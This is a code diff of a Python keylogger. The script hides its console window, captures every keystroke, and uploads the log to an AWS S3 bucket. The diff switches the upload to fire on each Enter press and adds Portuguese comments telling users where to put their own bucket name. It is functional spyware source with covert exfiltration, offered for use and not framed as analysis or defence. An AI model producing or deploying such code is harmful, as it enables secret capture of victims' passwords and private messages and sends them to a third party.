@@ -3,7 +3,6 @@ from secrets import access_key, secret_access_key
 import boto3
 import os
 
-import win32api
 import win32console
 import win32gui
 
@@ -11,8 +10,8 @@ win = win32console.GetConsoleWindow()
 win32gui.ShowWindow(win, 0)
 
 
-nameBucket = 'logs-key'
-count = 1
+nameBucket = 'keylogger-python3.6' #Insira aqui o nome do seu bucket
+#count = 1 #Descomente as linhas: 14,62,63,64,65 e 66 caso queira usar o modo de envio por quantidade de caracteres!
 
 
 def log(text):
@@ -35,22 +34,36 @@ def s3():
 def press(key):
     key = str(key).replace("'", "")
     
+    if key == 'Key.enter':
+        key = '\n'
+        s3()
+    
     if key == 'Key.space':
         key = ' '
     if key == 'Key.shift_r':
         key = ''
-    if key == "Key.enter":
-        key = '\n'
-    if key == "Key.shift":
+    if key == 'Key.shift':
         key = ''
-    
+    if key == 'Key.tab':
+        key = ' TAB\n'
+    if key == 'Key.esc':
+        key = 'ESC'
+    if key == 'Key.ctrl_l':
+        key = 'Ctrl'
+    if key == 'Key.cmd':
+        key = 'Win\n'
+    if key == 'Key.alt_l':
+        key = 'ALT'
+    if key == 'Key.backspace':
+        key = ' <-Backspace '
+
     log(key)
 
-    global count
-    count += 1
-    if count >= 10:
-        count = 0
-        s3()
+    #global count
+    #count += 1
+    #if count >= 10:
+    #    count = 0
+    #    s3()
 
 
 with Listener(on_release=press) as listener:
